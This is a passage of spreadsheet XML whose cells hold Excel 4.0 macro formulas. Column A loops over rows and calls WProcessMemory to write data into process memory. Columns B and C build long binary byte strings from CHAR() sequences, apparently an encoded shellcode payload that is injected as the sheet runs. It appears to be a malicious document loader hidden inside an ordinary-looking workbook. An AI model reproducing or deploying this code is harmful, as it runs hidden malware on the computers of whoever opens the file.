        <v>pû_x001B_ÖÈ!ír‰</v>
      </c>
    </row>
    <row r="13" spans="1:4" x14ac:dyDescent="0.25">
      <c r="A13" t="b">
        <f>WHILE(main&lt;&gt;"excel")</f>
        <v>1</v>
      </c>
      <c r="B13" t="str">
        <f>CHAR(127)&amp;CHAR(47)&amp;CHAR(23)&amp;CHAR(167)&amp;CHAR(44)&amp;CHAR(115)&amp;CHAR(230)&amp;CHAR(188)&amp;CHAR(201)&amp;CHAR(136)&amp;CHAR(254)&amp;CHAR(87)&amp;CHAR(42)&amp;CHAR(246)&amp;CHAR(83)&amp;CHAR(251)&amp;CHAR(233)&amp;CHAR(193)&amp;CHAR(125)&amp;CHAR(163)&amp;CHAR(210)&amp;CHAR(230)&amp;CHAR(53)&amp;CHAR(207)&amp;CHAR(106)&amp;CHAR(176)&amp;CHAR(87)&amp;CHAR(42)&amp;CHAR(88)&amp;CHAR(177)&amp;CHAR(65)&amp;CHAR(69)&amp;CHAR(132)&amp;CHAR(63)&amp;CHAR(91)&amp;CHAR(156)&amp;CHAR(185)&amp;CHAR(60)&amp;CHAR(111)&amp;CHAR(153)&amp;CHAR(250)&amp;CHAR(181)&amp;CHAR(24)&amp;CHAR(254)&amp;CHAR(46)&amp;CHAR(14)&amp;CHAR(168)&amp;CHAR(30)&amp;CHAR(195)&amp;CHAR(42)&amp;CHAR(48)&amp;CHAR(162)&amp;CHAR(22)&amp;CHAR(143)&amp;CHAR(239)&amp;CHAR(74)&amp;CHAR(162)&amp;CHAR(140)&amp;CHAR(96)&amp;CHAR(171)&amp;CHAR(29)&amp;CHAR(250)&amp;CHAR(235)&amp;CHAR(206)&amp;CHAR(193)&amp;CHAR(152)&amp;CHAR(58)&amp;CHAR(182)&amp;CHAR(72)&amp;CHAR(160)&amp;CHAR(109)&amp;CHAR(199)&amp;CHAR(28)&amp;CHAR(131)&amp;CHAR(167)&amp;CHAR(108)&amp;CHAR(2)&amp;CHAR(109)&amp;CHAR(140)&amp;CHAR(13)&amp;CHAR(146)&amp;CHAR(118)&amp;CHAR(226)&amp;CHAR(8)&amp;CHAR(56)&amp;CHAR(213)&amp;CHAR(204)&amp;CHAR(83)&amp;CHAR(20)&amp;CHAR(29)&amp;CHAR(151)&amp;CHAR(55)&amp;CHAR(82)&amp;CHAR(168)&amp;CHAR(216)&amp;CHAR(45)&amp;CHAR(100)&amp;CHAR(49)&amp;CHAR(88)&amp;CHAR(54)&amp;CHAR(254)&amp;CHAR(35)&amp;CHAR(126)&amp;CHAR(27)&amp;CHAR(12)&amp;CHAR(166)&amp;CHAR(233)&amp;CHAR(118)&amp;CHAR(21)&amp;CHAR(194)&amp;CHAR(33)&amp;CHAR(212)&amp;CHAR(42)&amp;CHAR(105)&amp;CHAR(12)&amp;CHAR(12)&amp;CHAR(198)&amp;CHAR(91)&amp;CHAR(154)&amp;CHAR(128)&amp;CHAR(146)&amp;CHAR(138)&amp;CHAR(54)&amp;CHAR(149)&amp;CHAR(151)&amp;CHAR(107)&amp;CHAR(163)&amp;CHAR(127)&amp;CHAR(52)&amp;CHAR(185)&amp;CHAR(99)&amp;CHAR(18)&amp;CHAR(235)&amp;CHAR(31)&amp;CHAR(64)&amp;CHAR(251)&amp;CHAR(96)&amp;CHAR(172)&amp;CHAR(223)&amp;CHAR(60)&amp;CHAR(194)&amp;CHAR(76)&amp;CHAR(190)&amp;CHAR(26)&amp;CHAR(255)&amp;CHAR(240)&amp;CHAR(2)&amp;CHAR(148)&amp;CHAR(59)&amp;CHAR(253)&amp;CHAR(228)&amp;CHAR(181)&amp;CHAR(246)&amp;CHAR(253)&amp;CHAR(158)&amp;CHAR(22)&amp;CHAR(75)&amp;CHAR(77)&amp;CHAR(30)&amp;CHAR(55)&amp;CHAR(201)&amp;CHAR(222)&amp;CHAR(72)&amp;CHAR(148)&amp;CHAR(25)&amp;CHAR(175)&amp;CHAR(45)&amp;CHAR(213)&amp;CHAR(118)&amp;CHAR(157)&amp;CHAR(180)&amp;CHAR(184)&amp;CHAR(8)&amp;CHAR(205)&amp;CHAR(239)&amp;CHAR(230)&amp;CHAR(48)&amp;CHAR(200)&amp;CHAR(254)&amp;CHAR(56)&amp;CHAR(220)&amp;CHAR(194)&amp;CHAR(185)&amp;CHAR(63)&amp;CHAR(41)&amp;CHAR(1)&amp;CHAR(211)&amp;CHAR(118)&amp;CHAR(104)&amp;CHAR(237)&amp;CHAR(144)&amp;CHAR(2)&amp;CHAR(206)&amp;CHAR(53)&amp;CHAR(176)&amp;CHAR(74)&amp;CHAR(37)&amp;CHAR(6)&amp;CHAR(90)&amp;CHAR(91)&amp;CHAR(156)&amp;CHAR(17)&amp;CHAR(40)&amp;CHAR(6)&amp;CHAR(101)&amp;CHAR(30)&amp;CHAR(173)&amp;CHAR(84)&amp;CHAR(17)&amp;CHAR(50)&amp;CHAR(120)&amp;CHAR(128)&amp;CHAR(9)&amp;CHAR(147)&amp;CHAR(36)&amp;CHAR(15)&amp;CHAR(229)&amp;CHAR(47)&amp;CHAR(53)&amp;CHAR(28)&amp;CHAR(10)&amp;CHAR(23)&amp;CHAR(181)&amp;CHAR(5)&amp;CHAR(202)&amp;CHAR(34)&amp;CHAR(220)&amp;CHAR(177)&amp;CHAR(35)&amp;CHAR(117)&amp;CHAR(80)&amp;CHAR(130)&amp;CHAR(237)&amp;CHAR(145)&amp;CHAR(100)&amp;CHAR(225)&amp;CHAR(117)&amp;CHAR(70)&amp;CHAR(11)&amp;CHAR(13)&amp;CHAR(155)&amp;CHAR(47)&amp;CHAR(85)&amp;CHAR(134)&amp;CHAR(23)&amp;CHAR(121)&amp;CHAR(105)&amp;CHAR(251)&amp;CHAR(94)&amp;CHAR(156)&amp;CHAR(234)&amp;CHAR(126)&amp;CHAR(10)&amp;CHAR(158)&amp;CHAR(107)</f>
        <v>/_x0017_§,sæ¼ÉˆþW*öSûéÁ}£Òæ5Ïj°W*X±AE„?[œ¹&lt;o™úµ_x0018_þ._x000E_¨_x001E_Ã*0¢_x0016_ïJ¢Œ`«_x001D_úëÎÁ˜:¶H mÇ_x001C_ƒ§l_x0002_mŒ_x000D_’vâ_x0008_8ÕÌS_x0014__x001D_—7R¨Ø-d1X6þ#~_x001B__x000C_¦év_x0015_Â!Ô*i_x000C__x000C_Æ[š€’Š6•—k£4¹c_x0012_ë_x001F_@û`¬ß&lt;ÂL¾_x001A_ÿð_x0002_”;ýäµöýž_x0016_KM_x001E_7ÉÞH”_x0019_¯-Õv´¸_x0008_Íïæ0Èþ8ÜÂ¹?)_x0001_Óvhí_x0002_Î5°J%_x0006_Z[œ_x0011_(_x0006_e_x001E_­T_x0011_2x€	“$_x000F_å/5_x001C_
_x0017_µ_x0005_Ê"Ü±#uP‚í‘dáuF_x000B__x000D_›/U†_x0017_yiû^œê~
žk</v>
      </c>
      <c r="C13" t="str">
        <f>CHAR(22)&amp;CHAR(212)&amp;CHAR(158)&amp;CHAR(67)&amp;CHAR(21)&amp;CHAR(128)&amp;CHAR(211)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)</f>
        <v>_x0016_ÔžC_x0015_€ÓÏ&gt;±</v>
      </c>
    </row>
    <row r="14" spans="1:4" x14ac:dyDescent="0.25">
      <c r="A14" t="b">
        <f>SET.VALUE(D2,LEN(main))</f>
        <v>1</v>
      </c>
      <c r="B14" t="str">
        <f>CHAR(11)&amp;CHAR(120)&amp;CHAR(192)&amp;CHAR(191)&amp;CHAR(217)&amp;CHAR(10)&amp;CHAR(16)&amp;CHAR(126)&amp;CHAR(182)&amp;CHAR(114)&amp;CHAR(186)&amp;CHAR(240)&amp;CHAR(188)&amp;CHAR(230)&amp;CHAR(16)&amp;CHAR(233)&amp;CHAR(200)&amp;CHAR(81)&amp;CHAR(165)&amp;CHAR(110)&amp;CHAR(185)&amp;CHAR(7)&amp;CHAR(134)&amp;CHAR(11)&amp;CHAR(52)&amp;CHAR(67)&amp;CHAR(160)&amp;CHAR(86)&amp;CHAR(242)&amp;CHAR(54)&amp;CHAR(66)&amp;CHAR(68)&amp;CHAR(195)&amp;CHAR(246)&amp;CHAR(171)&amp;CHAR(69)&amp;CHAR(131)&amp;CHAR(7)&amp;CHAR(208)&amp;CHAR(213)&amp;CHAR(189)&amp;CHAR(10)&amp;CHAR(12)&amp;CHAR(219)&amp;CHAR(169)&amp;CHAR(28)&amp;CHAR(96)&amp;CHAR(225)&amp;CHAR(236)&amp;CHAR(44)&amp;CHAR(166)&amp;CHAR(130)&amp;CHAR(55)&amp;CHAR(74)&amp;CHAR(42)&amp;CHAR(83)&amp;CHAR(5)&amp;CHAR(231)&amp;CHAR(231)&amp;CHAR(123)&amp;CHAR(65)&amp;CHAR(184)&amp;CHAR(245)&amp;CHAR(70)&amp;CHAR(14)&amp;CHAR(206)&amp;CHAR(154)&amp;CHAR(108)&amp;CHAR(91)&amp;CHAR(84)&amp;CHAR(221)&amp;CHAR(32)&amp;CHAR(232)&amp;CHAR(4)&amp;CHAR(91)&amp;CHAR(223)&amp;CHAR(207)&amp;CHAR(98)&amp;CHAR(52)&amp;CHAR(16)&amp;CHAR(56)&amp;CHAR(231)&amp;CHAR(221)&amp;CHAR(216)&amp;CHAR(185)&amp;CHAR(176)&amp;CHAR(87)&amp;CHAR(250)&amp;CHAR(243)&amp;CHAR(101)&amp;CHAR(65)&amp;CHAR(213)&amp;CHAR(246)&amp;CHAR(197)&amp;CHAR(118)&amp;CHAR(142)&amp;CHAR(161)&amp;CHAR(225)&amp;CHAR(196)&amp;CHAR(243)&amp;CHAR(183)&amp;CHAR(247)&amp;CHAR(67)&amp;CHAR(79)&amp;CHAR(39)&amp;CHAR(164)&amp;CHAR(9)&amp;CHAR(175)&amp;CHAR(8)&amp;CHAR(241)&amp;CHAR(18)&amp;CHAR(253)&amp;CHAR(17)&amp;CHAR(167)&amp;CHAR(55)&amp;CHAR(209)&amp;CHAR(196)&amp;CHAR(230)&amp;CHAR(230)&amp;CHAR(50)&amp;CHAR(138)&amp;CHAR(177)&amp;CHAR(58)&amp;CHAR(255)&amp;CHAR(188)&amp;CHAR(118)&amp;CHAR(54)&amp;CHAR(122)&amp;CHAR(199)&amp;CHAR(93)&amp;CHAR(74)&amp;CHAR(83)&amp;CHAR(198)&amp;CHAR(23)&amp;CHAR(215)&amp;CHAR(94)&amp;CHAR(104)&amp;CHAR(69)&amp;CHAR(211)&amp;CHAR(241)&amp;CHAR(32)&amp;CHAR(149)&amp;CHAR(37)&amp;CHAR(170)&amp;CHAR(99)&amp;CHAR(32)&amp;CHAR(200)&amp;CHAR(170)&amp;CHAR(219)&amp;CHAR(68)&amp;CHAR(29)&amp;CHAR(107)&amp;CHAR(189)&amp;CHAR(51)&amp;CHAR(206)&amp;CHAR(93)&amp;CHAR(142)&amp;CHAR(179)&amp;CHAR(177)&amp;CHAR(6)&amp;CHAR(224)&amp;CHAR(57)&amp;CHAR(58)&amp;CHAR(240)&amp;CHAR(35)&amp;CHAR(9)&amp;CHAR(82)&amp;CHAR(63)&amp;CHAR(60)&amp;CHAR(13)&amp;CHAR(170)&amp;CHAR(110)&amp;CHAR(96)&amp;CHAR(49)&amp;CHAR(210)&amp;CHAR(93)&amp;CHAR(242)&amp;CHAR(220)&amp;CHAR(146)&amp;CHAR(53)&amp;CHAR(108)&amp;CHAR(76)&amp;CHAR(68)&amp;CHAR(51)&amp;CHAR(115)&amp;CHAR(77)&amp;CHAR(52)&amp;CHAR(200)&amp;CHAR(64)&amp;CHAR(61)&amp;CHAR(144)&amp;CHAR(213)&amp;CHAR(201)&amp;CHAR(117)&amp;CHAR(230)&amp;CHAR(66)&amp;CHAR(77)&amp;CHAR(42)&amp;CHAR(137)&amp;CHAR(124)&amp;CHAR(217)&amp;CHAR(28)&amp;CHAR(186)&amp;CHAR(190)&amp;CHAR(59)&amp;CHAR(255)&amp;CHAR(243)&amp;CHAR(208)&amp;CHAR(20)&amp;CHAR(150)&amp;CHAR(101)&amp;CHAR(32)&amp;CHAR(6)&amp;CHAR(218)&amp;CHAR(2)&amp;CHAR(148)&amp;CHAR(180)&amp;CHAR(25)&amp;CHAR(76)&amp;CHAR(31)&amp;CHAR(62)&amp;CHAR(10)&amp;CHAR(254)&amp;CHAR(226)&amp;CHAR(61)&amp;CHAR(243)&amp;CHAR(139)&amp;CHAR(145)&amp;CHAR(128)&amp;CHAR(224)&amp;CHAR(153)&amp;CHAR(197)&amp;CHAR(80)&amp;CHAR(188)&amp;CHAR(236)&amp;CHAR(66)&amp;CHAR(33)&amp;CHAR(144)&amp;CHAR(3)&amp;CHAR(221)&amp;CHAR(228)&amp;CHAR(29)&amp;CHAR(204)&amp;CHAR(88)&amp;CHAR(3)&amp;CHAR(66)&amp;CHAR(129)&amp;CHAR(83)&amp;CHAR(134)&amp;CHAR(60)&amp;CHAR(172)&amp;CHAR(104)&amp;CHAR(90)&amp;CHAR(41)&amp;CHAR(8)</f>
        <v>_x000B_xÀ¿Ù
_x0010_~¶rºð¼æ_x0010_éÈQ¥n¹_x0007_†_x000B_4C Vò6BDÃö«Eƒ_x0007_ÐÕ½
_x000C_Û©_x001C_`áì,¦‚7J*S_x0005_çç{A¸õF_x000E_Îšl[TÝ è_x0004_[ßÏb4_x0010_8çÝØ¹°WúóeAÕöÅvŽ¡áÄó·÷CO'¤	¯_x0008_ñ_x0012_ý_x0011_§7ÑÄææ2Š±:ÿ¼v6zÇ]JSÆ_x0017_×^hEÓñ •%ªc ÈªÛD_x001D_k½3Î]Ž³±_x0006_à9:ð#	R?&lt;_x000D_ªn`1Ò]òÜ’5lLD3sM4È@=ÕÉuæBM*‰|Ù_x001C_º¾;ÿóÐ_x0014_–e _x0006_Ú_x0002_”´_x0019_L_x001F_&gt;
þâ=ó‹‘€à™ÅP¼ìB!_x0003_Ýä_x001D_ÌX_x0003_BS†&lt;¬hZ)_x0008_</v>
      </c>
      <c r="C14" t="str">
        <f>CHAR(158)&amp;CHAR(75)&amp;CHAR(231)&amp;CHAR(189)&amp;CHAR(178)&amp;CHAR(70)&amp;CHAR(206)&amp;CHAR(249)&amp;CHAR(91)&amp;CHAR(221)</f>
        <v>žKç½²FÎù[Ý</v>
      </c>
    </row>
    <row r="15" spans="1:4" x14ac:dyDescent="0.25">
      <c r="A15">
        <f>WProcessMemory(-1,A10+(D1*255),main,LEN(main),0)</f>
        <v>1</v>
      </c>
      <c r="B15" t="str">
        <f>CHAR(191)&amp;CHAR(102)&amp;CHAR(18)&amp;CHAR(162)&amp;CHAR(234)&amp;CHAR(168)&amp;CHAR(147)&amp;CHAR(69)&amp;CHAR(144)&amp;CHAR(196)&amp;CHAR(92)&amp;CHAR(168)&amp;CHAR(106)&amp;CHAR(146)&amp;CHAR(121)&amp;CHAR(80)&amp;CHAR(162)&amp;CHAR(123)&amp;CHAR(176)&amp;CHAR(106)&amp;CHAR(83)&amp;CHAR(221)&amp;CHAR(234)&amp;CHAR(130)&amp;CHAR(226)&amp;CHAR(162)&amp;CHAR(155)&amp;CHAR(83)&amp;CHAR(41)&amp;CHAR(93)&amp;CHAR(225)&amp;CHAR(32)&amp;CHAR(165)&amp;CHAR(122)&amp;CHAR(127)&amp;CHAR(70)&amp;CHAR(231)&amp;CHAR(221)&amp;CHAR(242)&amp;CHAR(254)&amp;CHAR(120)&amp;CHAR(215)&amp;CHAR(31)&amp;CHAR(157)&amp;CHAR(52)&amp;CHAR(104)&amp;CHAR(170)&amp;CHAR(121)&amp;CHAR(222)&amp;CHAR(73)&amp;CHAR(252)&amp;CHAR(146)&amp;CHAR(76)&amp;CHAR(57)&amp;CHAR(47)&amp;CHAR(219)&amp;CHAR(146)&amp;CHAR(182)&amp;CHAR(184)&amp;CHAR(124)&amp;CHAR(132)&amp;CHAR(52)&amp;CHAR(175)&amp;CHAR(96)&amp;CHAR(210)&amp;CHAR(219)&amp;CHAR(213)&amp;CHAR(94)&amp;CHAR(139)&amp;CHAR(237)&amp;CHAR(17)&amp;CHAR(226)&amp;CHAR(56)&amp;CHAR(49)&amp;CHAR(211)&amp;CHAR(206)&amp;CHAR(18)&amp;CHAR(212)&amp;CHAR(68)&amp;CHAR(35)&amp;CHAR(163)&amp;CHAR(198)&amp;CHAR(91)&amp;CHAR(178)&amp;CHAR(137)&amp;CHAR(206)&amp;CHAR(110)&amp;CHAR(250)&amp;CHAR(127)&amp;CHAR(175)&amp;CHAR(119)&amp;CHAR(186)&amp;CHAR(139)&amp;CHAR(216)&amp;CHAR(94)&amp;CHAR(163)&amp;CHAR(27)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(235)&amp;CHAR(117)&amp;CHAR(185)&amp;CHAR(165)&amp;CHAR(212)&amp;CHAR(149)&amp;CHAR(122)&amp;CHAR(159)&amp;CHAR(74)&amp;CHAR(143)&amp;CHAR(223)&amp;CHAR(138)&amp;CHAR(216)&amp;CHAR(214)&amp;CHAR(106)&amp;CHAR(128)&amp;CHAR(185)&amp;CHAR(213)&amp;CHAR(60)&amp;CHAR(115)&amp;CHAR(227)&amp;CHAR(78)&amp;CHAR(81)&amp;CHAR(73)&amp;CHAR(236)&amp;CHAR(80)&amp;CHAR(64)&amp;CHAR(156)&amp;CHAR(91)&amp;CHAR(234)&amp;CHAR(27)&amp;CHAR(45)&amp;CHAR(122)&amp;CHAR(230)&amp;CHAR(107)&amp;CHAR(82)&amp;CHAR(1)&amp;CHAR(25)&amp;CHAR(239)&amp;CHAR(72)&amp;CHAR(207)&amp;CHAR(73)&amp;CHAR(236)&amp;CHAR(219)&amp;CHAR(229)&amp;CHAR(87)&amp;CHAR(214)&amp;CHAR(209)&amp;CHAR(107)&amp;CHAR(188)&amp;CHAR(41)&amp;CHAR(233)&amp;CHAR(231)&amp;CHAR(205)&amp;CHAR(76)&amp;CHAR(213)&amp;CHAR(5)&amp;CHAR(143)&amp;CHAR(77)&amp;CHAR(135)&amp;CHAR(146)&amp;CHAR(33)&amp;CHAR(68)&amp;CHAR(37)&amp;CHAR(90)&amp;CHAR(230)&amp;CHAR(98)&amp;CHAR(136)&amp;CHAR(159)&amp;CHAR(226)&amp;CHAR(80)&amp;CHAR(16)&amp;CHAR(21)&amp;CHAR(95)&amp;CHAR(23)&amp;CHAR(73)&amp;CHAR(68)&amp;CHAR(93)&amp;CHAR(234)&amp;CHAR(166)&amp;CHAR(249)&amp;CHAR(67)&amp;CHAR(31)&amp;CHAR(247)&amp;CHAR(74)&amp;CHAR(124)&amp;CHAR(57)&amp;CHAR(83)&amp;CHAR(243)&amp;CHAR(104)&amp;CHAR(191)&amp;CHAR(108)&amp;CHAR(241)&amp;CHAR(187)&amp;CHAR(80)&amp;CHAR(145)&amp;CHAR(159)&amp;CHAR(252)&amp;CHAR(247)&amp;CHAR(246)&amp;CHAR(250)&amp;CHAR(137)&amp;CHAR(38)&amp;CHAR(206)&amp;CHAR(77)&amp;CHAR(159)&amp;CHAR(175)&amp;CHAR(214)&amp;CHAR(213)&amp;CHAR(201)&amp;CHAR(251)&amp;CHAR(216)&amp;CHAR(81)&amp;CHAR(216)&amp;CHAR(110)&amp;CHAR(1)&amp;CHAR(50)&amp;CHAR(33)&amp;CHAR(241)&amp;CHAR(212)&amp;CHAR(120)&amp;CHAR(67)&amp;CHAR(97)&amp;CHAR(78)&amp;CHAR(91)&amp;CHAR(35)&amp;CHAR(212)&amp;CHAR(107)&amp;CHAR(169)&amp;CHAR(114)&amp;CHAR(88)&amp;CHAR(226)&amp;CHAR(52)&amp;CHAR(55)&amp;CHAR(124)&amp;CHAR(223)&amp;CHAR(17)&amp;CHAR(106)&amp;CHAR(171)&amp;CHAR(170)&amp;CHAR(16)&amp;CHAR(211)&amp;CHAR(140)&amp;CHAR(87)&amp;CHAR(237)&amp;CHAR(100)&amp;CHAR(70)&amp;CHAR(187)&amp;CHAR(209)&amp;CHAR(239)&amp;CHAR(197)&amp;CHAR(62)&amp;CHAR(82)&amp;CHAR(246)&amp;CHAR(218)&amp;CHAR(251)</f>
        <v>¿f_x0012_¢ê¨“EÄ\¨j’yP¢{°jSÝê‚â¢›S)]á ¥zFçÝòþx×_x001F_4hªyÞIü’L9/Û’¶¸|„4¯`ÒÛÕ^‹í_x0011_â81ÓÎ_x0012_ÔD#£Æ[²‰Înú¯wº‹Ø^£_x001B_¥ûëu¹¥Ô•zŸJßŠØÖj€¹Õ&lt;sãNQIìP@œ[ê_x001B_-zækR_x0001__x0019_ïHÏIìÛåWÖÑk¼)éçÍLÕ_x0005_M‡’!D%ZæbˆŸâP_x0010__x0015___x0017_ID]ê¦ùC_x001F_÷J|9Sóh¿lñ»P‘Ÿü÷öú‰&amp;ÎMŸ¯ÖÕÉûØQØn_x0001_2!ñÔxCaN[#Ôk©rXâ47|ß_x0011_j«ª_x0010_ÓŒWídF»ÑïÅ&gt;RöÚû</v>
      </c>
      <c r="C15" t="str">
        <f>CHAR(145)&amp;CHAR(163)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(118)&amp;CHAR(60)&amp;CHAR(219)&amp;CHAR(84)&amp;CHAR(39)&amp;CHAR(165)</f>
        <v>‘£ûÏv&lt;ÛT'¥</v>
      </c>
    </row>
    <row r="16" spans="1:4" x14ac:dyDescent="0.25">
      <c r="A16" t="b">
        <f>SET.VALUE(D1,D1+1)</f>
        <v>1</v>
      </c>
      <c r="B16" t="str">
        <f>CHAR(168)&amp;CHAR(17)&amp;CHAR(51)&amp;CHAR(133)&amp;CHAR(8)&amp;CHAR(120)&amp;CHAR(181)&amp;CHAR(181)&amp;CHAR(209)&amp;CHAR(97)&amp;CHAR(114)&amp;CHAR(164)&amp;CHAR(26)&amp;CHAR(5)&amp;CHAR(107)&amp;CHAR(189)&amp;CHAR(76)&amp;CHAR(70)&amp;CHAR(207)&amp;CHAR(76)&amp;CHAR(79)&amp;CHAR(85)&amp;CHAR(82)&amp;CHAR(44)&amp;CHAR(205)&amp;CHAR(117)&amp;CHAR(66)&amp;CHAR(102)&amp;CHAR(68)&amp;CHAR(248)&amp;CHAR(154)&amp;CHAR(148)&amp;CHAR(193)&amp;CHAR(79)&amp;CHAR(225)&amp;CHAR(201)&amp;CHAR(2)&amp;CHAR(8)&amp;CHAR(158)&amp;CHAR(101)&amp;CHAR(216)&amp;CHAR(202)&amp;CHAR(91)&amp;CHAR(235)&amp;CHAR(173)&amp;CHAR(129)&amp;CHAR(187)&amp;CHAR(103)&amp;CHAR(197)&amp;CHAR(99)&amp;CHAR(111)&amp;CHAR(175)&amp;CHAR(71)&amp;CHAR(6)&amp;CHAR(85)&amp;CHAR(25)&amp;CHAR(254)&amp;CHAR(238)&amp;CHAR(187)&amp;CHAR(52)&amp;CHAR(21)&amp;CHAR(253)&amp;CHAR(251)&amp;CHAR(15)&amp;CHAR(125)&amp;CHAR(118)&amp;CHAR(109)&amp;CHAR(236)&amp;CHAR(164)&amp;CHAR(245)&amp;CHAR(24)&amp;CHAR(238)&amp;CHAR(250)&amp;CHAR(59)&amp;CHAR(110)&amp;CHAR(245)&amp;CHAR(251)&amp;CHAR(120)&amp;CHAR(217)&amp;CHAR(180)&amp;CHAR(204)&amp;CHAR(119)&amp;CHAR(196)&amp;CHAR(151)&amp;CHAR(148)&amp;CHAR(135)&amp;CHAR(225)&amp;CHAR(250)&amp;CHAR(101)&amp;CHAR(234)&amp;CHAR(49)&amp;CHAR(171)&amp;CHAR(92)&amp;CHAR(49)&amp;CHAR(51)&amp;CHAR(230)&amp;CHAR(193)&amp;CHAR(79)&amp;CHAR(147)&amp;CHAR(207)&amp;CHAR(78)&amp;CHAR(135)&amp;CHAR(139)&amp;CHAR(60)&amp;CHAR(190)&amp;CHAR(206)&amp;CHAR(106)&amp;CHAR(35)&amp;CHAR(236)&amp;CHAR(46)&amp;CHAR(43)&amp;CHAR(188)&amp;CHAR(18)&amp;CHAR(224)&amp;CHAR(162)&amp;CHAR(160)&amp;CHAR(124)&amp;CHAR(134)&amp;CHAR(237)&amp;CHAR(255)&amp;CHAR(158)&amp;CHAR(174)&amp;CHAR(198)&amp;CHAR(168)&amp;CHAR(10)&amp;CHAR(51)&amp;CHAR(211)&amp;CHAR(207)&amp;CHAR(120)&amp;CHAR(92)&amp;CHAR(192)&amp;CHAR(117)&amp;CHAR(77)&amp;CHAR(216)&amp;CHAR(28)&amp;CHAR(240)&amp;CHAR(166)&amp;CHAR(20)&amp;CHAR(140)&amp;CHAR(92)&amp;CHAR(223)&amp;CHAR(134)&amp;CHAR(100)&amp;CHAR(139)&amp;CHAR(141)&amp;CHAR(123)&amp;CHAR(54)&amp;CHAR(220)&amp;CHAR(45)&amp;CHAR(99)&amp;CHAR(139)&amp;CHAR(239)&amp;CHAR(223)&amp;CHAR(73)&amp;CHAR(69)&amp;CHAR(14)&amp;CHAR(48)&amp;CHAR(141)&amp;CHAR(251)&amp;CHAR(149)&amp;CHAR(212)&amp;CHAR(53)&amp;CHAR(248)&amp;CHAR(158)&amp;CHAR(31)&amp;CHAR(54)&amp;CHAR(218)&amp;CHAR(9)&amp;CHAR(105)&amp;CHAR(39)&amp;CHAR(139)&amp;CHAR(59)&amp;CHAR(40)&amp;CHAR(105)&amp;CHAR(23)&amp;CHAR(61)&amp;CHAR(121)&amp;CHAR(22)&amp;CHAR(4)&amp;CHAR(202)&amp;CHAR(196)&amp;CHAR(219)&amp;CHAR(8)&amp;CHAR(7)&amp;CHAR(28)&amp;CHAR(13)&amp;CHAR(81)&amp;CHAR(59)&amp;CHAR(16)&amp;CHAR(122)&amp;CHAR(134)&amp;CHAR(171)&amp;CHAR(242)&amp;CHAR(192)&amp;CHAR(236)&amp;CHAR(76)&amp;CHAR(132)&amp;CHAR(9)&amp;CHAR(195)&amp;CHAR(49)&amp;CHAR(160)&amp;CHAR(105)&amp;CHAR(11)&amp;CHAR(35)&amp;CHAR(204)&amp;CHAR(160)&amp;CHAR(53)&amp;CHAR(50)&amp;CHAR(245)&amp;CHAR(234)&amp;CHAR(16)&amp;CHAR(252)&amp;CHAR(248)&amp;CHAR(243)&amp;CHAR(83)&amp;CHAR(75)&amp;CHAR(153)&amp;CHAR(167)&amp;CHAR(216)&amp;CHAR(231)&amp;CHAR(105)&amp;CHAR(84)&amp;CHAR(125)&amp;CHAR(75)&amp;CHAR(157)&amp;CHAR(46)&amp;CHAR(201)&amp;CHAR(1)&amp;CHAR(161)&amp;CHAR(177)&amp;CHAR(157)&amp;CHAR(119)&amp;CHAR(109)&amp;CHAR(49)&amp;CHAR(191)&amp;CHAR(225)&amp;CHAR(52)&amp;CHAR(81)&amp;CHAR(49)&amp;CHAR(44)&amp;CHAR(70)&amp;CHAR(145)&amp;CHAR(117)&amp;CHAR(6)&amp;CHAR(159)&amp;CHAR(200)&amp;CHAR(151)&amp;CHAR(122)&amp;CHAR(86)&amp;CHAR(49)&amp;CHAR(252)&amp;CHAR(213)&amp;CHAR(87)&amp;CHAR(47)&amp;CHAR(199)</f>
        <v>¨_x0011_3…_x0008_xµµÑar¤_x001A__x0005_k½LFÏLOUR,ÍuBfDøš”ÁOáÉ_x0002__x0008_žeØÊ[ë­»gÅco¯G_x0006_U_x0019_þî»4_x0015_ýû_x000F_}vmì¤õ_x0018_îú;nõûxÙ´ÌwÄ—”‡áúeê1«\13æÁO“ÏN‡‹&lt;¾Îj#ì.+¼_x0012_à¢ |†íÿž®Æ¨
3ÓÏx\ÀuMØ_x001C_ð¦_x0014_Œ\ß†d‹{6Ü-c‹ïßIE_x000E_0û•Ô5øž_x001F_6Ú	i'‹;(i_x0017_=y_x0016__x0004_ÊÄÛ_x0008__x0007__x001C__x000D_Q;_x0010_z†«òÀìL„	Ã1 i_x000B_#Ì 52õê_x0010_üøóSK™§ØçiT}K.É_x0001_¡±wm1¿á4Q1,F‘u_x0006_ŸÈ—zV1üÕW/Ç</v>
      </c>
      <c r="C16" t="str">
        <f>CHAR(251)&amp;CHAR(39)&amp;CHAR(148)&amp;CHAR(181)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(105)&amp;CHAR(40)&amp;CHAR(246)&amp;CHAR(12)</f>
        <v>û'”µÖÈi(ö_x000C_</v>
      </c>
    </row>
    <row r="17" spans="1:3" x14ac:dyDescent="0.25">
      <c r="A17" t="b">
        <f bx="1">main=ABSREF("R[1]C",main)</f>
        <v>1</v>
      </c>
      <c r="B17" t="str">
        <f>CHAR(20)&amp;CHAR(176)&amp;CHAR(207)&amp;CHAR(57)&amp;CHAR(106)&amp;CHAR(171)&amp;CHAR(234)&amp;CHAR(64)&amp;CHAR(125)&amp;CHAR(44)&amp;CHAR(24)&amp;CHAR(29)&amp;CHAR(133)&amp;CHAR(140)&amp;CHAR(173)&amp;CHAR(165)&amp;CHAR(97)&amp;CHAR(110)&amp;CHAR(106)&amp;CHAR(118)&amp;CHAR(215)&amp;CHAR(243)&amp;CHAR(121)&amp;CHAR(197)&amp;CHAR(16)&amp;CHAR(252)&amp;CHAR(45)&amp;CHAR(93)&amp;CHAR(119)&amp;CHAR(110)&amp;CHAR(71)&amp;CHAR(36)&amp;CHAR(44)&amp;CHAR(168)&amp;CHAR(171)&amp;CHAR(35)&amp;CHAR(185)&amp;CHAR(97)&amp;CHAR(8)&amp;CHAR(137)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(184)&amp;CHAR(7)&amp;CHAR(108)&amp;CHAR(133)&amp;CHAR(219)&amp;CHAR(144)&amp;CHAR(42)&amp;CHAR(238)&amp;CHAR(220)&amp;CHAR(173)&amp;CHAR(77)&amp;CHAR(203)&amp;CHAR(225)&amp;CHAR(210)&amp;CHAR(225)&amp;CHAR(132)&amp;CHAR(141)&amp;CHAR(8)&amp;CHAR(84)&amp;CHAR(77)&amp;CHAR(212)&amp;CHAR(33)&amp;CHAR(222)&a